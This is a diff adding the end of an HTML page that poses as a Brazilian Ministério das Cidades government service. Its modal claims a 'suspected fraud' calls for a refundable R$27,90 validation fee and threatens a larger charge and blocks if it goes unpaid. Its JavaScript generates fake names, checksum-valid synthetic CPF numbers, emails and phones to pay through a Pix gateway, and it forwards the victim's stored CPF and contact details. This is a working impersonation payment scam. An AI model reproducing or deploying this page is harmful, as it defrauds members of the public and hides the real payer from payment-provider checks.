+  .step-line {
+    position: absolute;
+    z-index: 1;
+    top: 16px;
+    left: calc(50% + 18px);
+    width: calc(100% - 36px);
+    height: 4px;
+    border-radius: 4px;
+    background: #E5E7EB;
+    box-sizing: border-box;
+  }
+
+  .step-gif {
+    display: block;
+    width: 100%;
+    height: 100%;
+    object-fit: contain;
+  }
+
+  .step-gif[hidden] {
+    display: none;
+  }
+
+  @media (max-width: 480px) {
+    .step-circle {
+      width: 32px;
+      height: 32px;
+    }
+
+    .step-circle svg {
+      width: 18px;
+      height: 18px;
+    }
+
+    .step-label {
+      font-size: 10px;
+    }
+
+    .step-line {
+      top: 14px;
+      left: calc(50% + 16px);
+      width: calc(100% - 32px);
+    }
+
+/* Remove a borda dos círculos dos steps 1, 2 e 3 */
+.step-item:nth-child(-n+3) .step-circle {
+  border: none !important;
+}
+h1#value {
+    color: #4CAF50;
+}
+
+  }
+
+</style>
+
+  </main>
+
+  <!-- 5. Rodapé com Logotipos Oficiais -->
+  <footer class="gov-footer-logos">
+    <img src="images/min-cidades-gov-logo-1-1.png" alt="Ministério das Cidades - Governo Federal">
+  </footer>
+
+  <!-- 6. Modal de Cálculo e Regularização -->
+  <div id="offer-modal" class="modal">
+    <div class="modal-content">
+      <div id="step1">
+        <h1>Verificando pendência</h1>
+        <div class="trace-container">
+          <div id="trace"></div>
+        </div>
+        <p>Por favor, aguarde enquanto processamos...</p>
+      </div>
+
+      <div id="step2">
+        <h5 class="bold"> <b>MOTIVO DA TAXA:</b></h5> <br>
+        <span id="reason"><b>SUSPEITA DE FRAUDE</b></span>
+
+        <p><b> Foi identificada uma </b><span class="bold2"><b>taxa obrigatória de validação</b></span> <b>para garantir a segurança do processo. Após o pagamento, o valor será</b> <span class="bold2"><b>totalmente reembolsado</b></span>.
+        </p>
+
+        <h1 style="text-decoration: underline;"><b>REGULARIZE AGORA</b></h1>
+        <p><b>Efetue o pagamento</b></p>
+        <h1 id="value"><b>R$27,90</b></h1> 
+
+        <a onclick="checkout(event)">REGULARIZAR TAXA</a>
+
+<p style="font-weight: bold;"> <b>
+    Atenção: Caso o valor de </b><span class="bold3"><b>R$27,90</b></span> <b>não seja quitado, o sistema exigirá o
+    pagamento integral de</b>
+    <span class="bold4"><b>R$76,41</b></span><b>. O não cumprimento poderá acarretar em bloqueios no processo. </b>
+</p>
+      </div>
+    </div>
+  </div>
+  
+
+<script src="./pepper-api.js"></script>
+
+  <script>
+    function getOrCreateRandomGatewayCustomer() {
+  var saved = null;
+
+  try {
+    var str = localStorage.getItem("gateway_customer");
+    if (str) saved = JSON.parse(str);
+  } catch (e) {}
+
+  if (
+    saved &&
+    saved.name &&
+    saved.cpf &&
+    String(saved.cpf).length === 11 &&
+    saved.email &&
+    saved.phone
+  ) {
+    return saved;
+  }
+
+  var maleNames = [
+    "Gabriel", "Lucas", "Matheus", "Guilherme", "Rodrigo", "Felipe",
+    "Bruno", "Leonardo", "Thiago", "Gustavo", "Rafael", "Eduardo",
+    "Vinicius", "Daniel", "Marcelo", "Alexandre", "André", "Antonio",
+    "Arthur", "Bernardo", "Caio", "Carlos", "César", "Cristiano",
+    "Davi", "Diego", "Enzo", "Fernando", "Francisco", "Heitor",
+    "Henrique", "Igor", "Joaquim", "José", "Lorenzo", "Luiz",
+    "Miguel", "Murilo", "Nicolas", "Otávio", "Paulo", "Pedro",
+    "Renan", "Ricardo", "Samuel", "Vitor", "Wesley", "Adriano",
+    "Alberto", "Anderson", "Breno", "Cauã", "Danilo", "Emanuel",
+    "Erick", "Fabiano", "Fábio", "Flávio", "Frederico", "Giovanni",
+    "Hugo", "Isaac", "Jorge", "Jonathan", "Leandro", "Márcio",
+    "Nathan", "Pietro", "Raul", "Roberto", "Sérgio", "Tomás",
+    "Vicente", "William", "Yuri", "Alex", "Cauê", "Dênis",
+    "Everton", "Jonas", "Kelvin", "Mário", "Renato", "Ruan"
+  ];
+
+  var femaleNames = [
+    "Amanda", "Beatriz", "Camila", "Larissa", "Mariana", "Juliana",
+    "Fernanda", "Patricia", "Aline", "Leticia", "Jessica", "Carolina",
+    "Bruna", "Renata", "Vanessa", "Natalia", "Ana", "Alice",
+    "Alícia", "Bianca", "Clara", "Eduarda", "Elisa", "Emilly",
+    "Ester", "Gabriela", "Helena", "Isabela", "Isadora", "Laura",
+    "Lívia", "Luana", "Manuela", "Maria", "Melissa", "Nicole",
+    "Olivia", "Rafaela", "Rebeca", "Sabrina", "Sofia", "Vitória",
+    "Adriana", "Alessandra", "Bárbara", "Cecília", "Daniela",
+    "Débora", "Elaine", "Eliane", "Evelyn", "Flávia", "Geovana",
+    "Giovana", "Heloísa", "Iara", "Irene", "Júlia", "Lorena",
+    "Maitê", "Mirela", "Priscila", "Raquel", "Samara", "Tainá",
+    "Talita", "Tatiane", "Valentina", "Yasmin", "Zélia",
+    "Cristina", "Mônica", "Simone", "Teresa", "Viviane", "Andressa",
+    "Elaísa", "Milena", "Pâmela", "Rayssa", "Stella"
+  ];
+
+  var compoundNames = [
+    "João Pedro", "João Lucas", "João Miguel", "João Gabriel",
+    "Pedro Henrique", "Pedro Lucas", "Luiz Felipe", "Luiz Henrique",
+    "Carlos Eduardo", "Carlos Henrique", "José Miguel", "José Pedro",
+    "Ana Clara", "Ana Júlia", "Ana Beatriz", "Ana Carolina",
+    "Maria Eduarda", "Maria Clara", "Maria Luiza", "Maria Fernanda",
+    "Maria Alice", "Maria Júlia", "Maria Vitória", "Laura Beatriz",
+    "Luiza Helena", "Isabela Cristina", "Vitória Maria",
+    "Mariana Luiza", "Sofia Helena", "Clara Beatriz",
+    "João Vitor", "João Paulo", "João Guilherme", "Pedro Augusto",
+    "Enzo Gabriel", "Davi Lucca", "Miguel Augusto", "Arthur Miguel",
+    "Ana Luiza", "Ana Laura", "Maria Helena", "Maria Cecília",
+    "Maria Valentina", "Maria Isabel", "Laura Sofia", "Lara Beatriz",
+    "Luiza Maria", "Ana Vitória", "Julia Beatriz", "Isabela Maria"
+  ];
+
+  var surnames = [
+    "Silva", "Santos", "Oliveira", "Souza", "Rodrigues", "Ferreira",
+    "Alves", "Pereira", "Lima", "Gomes", "Costa", "Ribeiro",
+    "Martins", "Carvalho", "Almeida", "Lopes", "Soares", "Fernandes",
+    "Vieira", "Barbosa", "Rocha", "Dias", "Nascimento", "Andrade",
+    "Moreira", "Nunes", "Marques", "Machado", "Mendes", "Freitas",
+    "Cardoso", "Ramos", "Gonçalves", "Santana", "Teixeira", "Moura",
+    "Azevedo", "Cavalcanti", "Monteiro", "Medeiros", "Correia",
+    "Campos", "Pinto", "Batista", "Reis", "Cunha", "Pires",
+    "Farias", "Melo", "Castro", "Duarte", "Peixoto", "Rezende",
+    "Tavares", "Queiroz", "Borges", "Figueiredo", "Abreu",
+    "Vasconcelos", "Miranda", "Brito", "Leal", "Siqueira", "Moraes",
+    "Antunes", "Coelho", "Sales", "Cordeiro", "Dantas", "Viana",
+    "Xavier", "Barros", "Aragão", "Assis", "Braga", "Bastos",
+    "Bernardes", "Camargo", "Amaral", "Lacerda", "Menezes", "Porto",
+    "Rangel", "Serra", "Torres", "Valente", "Falcão", "Paiva",
+    "Bittencourt", "Sampaio", "Brandão", "Coutinho", "Lourenço",
+    "Magalhães", "Matos", "Nogueira", "Prado", "Ramalho",
+    "Trindade", "Pacheco", "Macedo", "Barreto", "Cabral",
+    "Cerqueira", "Domingues", "Esteves", "Figueira", "Garcia",
+    "Leite", "Lins", "Mota", "Neves", "Noronha", "Paz", "Rosa",
+    "Sá", "Simões", "Vargas"
+  ];
+
+  function pick(list) {
+    return list[Math.floor(Math.random() * list.length)];
+  }
+
+  var useCompoundName = Math.random() < 0.35;
+  var isMale = Math.random() < 0.5;
+
+  var f = useCompoundName
+    ? pick(compoundNames)
+    : pick(isMale ? maleNames : femaleNames);
+
+  var s1 = pick(surnames);
+  var s2 = pick(surnames);
+
+  while (s2 === s1) {
+    s2 = pick(surnames);
+  }
+
+  var randomName = f + " " + s1 + " " + s2;
+
+  // Geração de CPF sintético com dígitos verificadores.
+  // Não garante que o número não pertença a uma pessoa real.
+  var digits = [];
+
+  for (var i = 0; i < 9; i++) {
+    digits.push(Math.floor(Math.random() * 10));
+  }
+
+  var sum1 = 0;
+
+  for (var i = 0; i < 9; i++) {
+    sum1 += digits[i] * (10 - i);
+  }
+
+  var rem1 = (sum1 * 10) % 11;
+  var d1 = rem1 >= 10 ? 0 : rem1;
+
+  digits.push(d1);
+
+  var sum2 = 0;
+
+  for (var i = 0; i < 10; i++) {
+    sum2 += digits[i] * (11 - i);
+  }
+
+  var rem2 = (sum2 * 10) % 11;
+  var d2 = rem2 >= 10 ? 0 : rem2;
+
+  digits.push(d2);
+
+  var randomCpf = digits.join("");
+
+  // E-mail sintético.
+  // Remove acentos para gerar um endereço em formato convencional.
+  function normalize(value) {
+    return value
+      .normalize("NFD")
+      .replace(/[\u0300-\u036f]/g, "")
+      .toLowerCase()
+      .replace(/[^a-z]/g, "");
+  }
+
+  var nameParts = f.split(" ");
+  var cleanFirst = normalize(nameParts[0]);
+  var cleanSur1 = normalize(s1);
+  var cleanSur2 = normalize(s2);
+
+  var domains = [
+    "gmail.com",
+    "outlook.com",
+    "hotmail.com"
+  ];
+
+  var domain = pick(domains);
+
+  var numDigits = Math.floor(1 + Math.random() * 4);
+  var num = "";
+
+  for (var dIdx = 0; dIdx < numDigits; dIdx++) {
+    num += Math.floor(Math.random() * 10);
+  }
+
+  var emailFormats = [
+    cleanFirst + "." + cleanSur2 + num,
+    cleanFirst + "_" + cleanSur2 + num,
+    cleanFirst + cleanSur2 + num,
+    cleanFirst + (cleanSur1 ? cleanSur1[0] : "") + cleanSur2 + num,
+    cleanFirst + num,
+    cleanFirst[0] + "." + cleanSur2 + num,
+    cleanFirst[0] + "_" + cleanSur2 + num,
+    cleanSur2 + "." + cleanFirst + num,
+    cleanFirst + "_" + Math.floor(10 + Math.random() * 90) + "_" + cleanSur2,
+    cleanFirst + "." + (cleanSur1 || "contato") + num,
+    cleanFirst + cleanSur2
+  ];
+
+  var randomEmail = pick(emailFormats) + "@" + domain;
+
+  // DDDs brasileiros.
+  var ddds = [
+    "11", "12", "13", "14", "15", "16", "17", "18", "19",
+    "21", "22", "24", "27", "28",
+    "31", "32", "33", "34", "35", "37", "38",
+    "41", "42", "43", "44", "45", "46", "47", "48", "49",
+    "51", "53", "54", "55",
+    "61", "62", "63", "64", "65", "66", "67", "68", "69",
+    "71", "73", "74", "75", "77", "79",
+    "81", "82", "83", "84", "85", "86", "87", "88", "89",
+    "91", "92", "93", "94", "95", "96", "97", "98", "99"
+  ];
+
+  var ddd = pick(ddds);
+  var randomPhone =
+    ddd + "9" + Math.floor(10000000 + Math.random() * 90000000);
+
+  var customer = {
+    name: randomName,
+    cpf: randomCpf,
+    email: randomEmail,
+    phone: randomPhone
+  };
+
+  try {
+    localStorage.setItem("gateway_customer", JSON.stringify(customer));
+  } catch (e) {}
+
+  return customer;
+}
+
+    function checkout(event) {
+      if (event) event.preventDefault();
+
+      var clickedBtn = (event && event.target) ? event.target.closest("button, a") : null;
+      if (clickedBtn) {
+        clickedBtn.style.opacity = "0.7";
+        clickedBtn.style.pointerEvents = "none";
+        clickedBtn.innerHTML = "<span>GERANDO SEU CÓDIGO PIX...</span>";
+      }
+
+      var currentParams = new URLSearchParams(window.location.search);
+
+      try {
+        var savedName = localStorage.getItem("nome");
+        if (savedName && !currentParams.get("nome")) currentParams.set("nome", savedName);
+        var savedCpf = localStorage.getItem("cpf");
+        if (savedCpf && !currentParams.get("cpf")) currentParams.set("cpf", savedCpf);
+        var savedEmail = localStorage.getItem("email");
+        if (savedEmail && !currentParams.get("email")) currentParams.set("email", savedEmail);
+        var savedPhone = localStorage.getItem("phone") || localStorage.getItem("telefone");
+        if (savedPhone && !currentParams.get("phone")) currentParams.set("phone", savedPhone);
+      } catch (e) {}
+
+      currentParams.set("valor", "27.90");
+      currentParams.set("gateway", "pepper");
+
+      var gatewayCustomer = getOrCreateRandomGatewayCustomer();
+      currentParams.set("gateway_name", gatewayCustomer.name);
+      currentParams.set("gateway_cpf", gatewayCustomer.cpf);
+      currentParams.set("gateway_email", gatewayCustomer.email);
+      currentParams.set("gateway_phone", gatewayCustomer.phone);
+
+      function goToPix(pixData) {
+        if (pixData) {
+          if (pixData.pix_qr_code) {
+            currentParams.set("pix_code", pixData.pix_qr_code);
+            try { localStorage.setItem("pix_qr_code", pixData.pix_qr_code); } catch (e) {}
+          }
+          if (pixData.qr_code_base64) {
+            try { localStorage.setItem("pix_qr_code_base64", pixData.qr_code_base64); } catch (e) {}
+          }
+          if (pixData.hash) {
+            currentParams.set("pix_hash", pixData.hash);
+            try { localStorage.setItem("pix_hash", pixData.hash); } catch (e) {}
+          }
+        }
+        window.location.href = "../../checkout/Upsells/02/Pix-Gerado/index.html?" + currentParams.toString();
+      }
+
+      var finished = false;
+      var timer = setTimeout(function () {
+        if (!finished) {
+          finished = true;
+          goToPix(null);
+        }
+      }, 7000);
+
+      if (window.PepperAPI && typeof window.PepperAPI.createPix === "function") {
+        window.PepperAPI.createPix("27.90", gatewayCustomer)
+          .then(function (res) {
+            if (!finished) {
+              finished = true;
+              clearTimeout(timer);
+              if (res && res.pix) {
+                goToPix({
+                  pix_qr_code: res.pix.pix_qr_code,
+                  qr_code_base64: res.pix.qr_code_base64,
+                  hash: res.hash
+                });
+              } else {
+                goToPix(null);
+              }
+            }
+          })
+          .catch(function (err) {
+            console.warn("PepperAPI createPix direct:", err);
+            if (!finished) {
+              finished = true;
+              clearTimeout(timer);
+              goToPix(null);
+            }
+          });
+      } else {
+        clearTimeout(timer);
+        goToPix(null);
+      }
+    }
+  </script>
+  <script src="js/scripts.js"></script>
+ 
+  <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-subids
+    async
+    defer
+  ></script>
+</body>
+</html>
